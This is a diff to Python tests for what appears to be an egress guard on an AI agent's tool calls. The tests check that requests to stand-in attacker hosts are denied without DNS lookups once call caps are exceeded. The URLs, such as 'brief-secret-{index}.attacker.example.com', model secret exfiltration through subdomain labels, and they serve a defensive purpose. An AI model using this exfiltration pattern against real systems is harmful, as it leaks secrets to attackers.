@@ -129,7 +129,7 @@ def test_a_call_over_its_cap_never_looks_up_dns(make_box: MakeBox) -> None:
 
     assert fetch(box, "https://example.com/", resolver) == "allow"
     for index in range(5):
-        url = f"https://brief-secret-{index}.attacker.example/"
+        url = f"https://brief-secret-{index}.attacker.example.com/"
         assert fetch(box, url, resolver) == "deny"
 
     assert resolver.lookups == ["example.com"]
@@ -144,7 +144,7 @@ def test_a_call_over_the_total_cap_never_looks_up_dns(make_box: MakeBox) -> None
     argv = ["--policy", str(box.staging.paths.policy), "--event", "pre-tool-use"]
     guard.run(argv, search, now=NOW)
 
-    assert fetch(box, "https://attacker.example/", resolver) == "deny"
+    assert fetch(box, "https://attacker.example.com/", resolver) == "deny"
     assert resolver.lookups == []
 
 
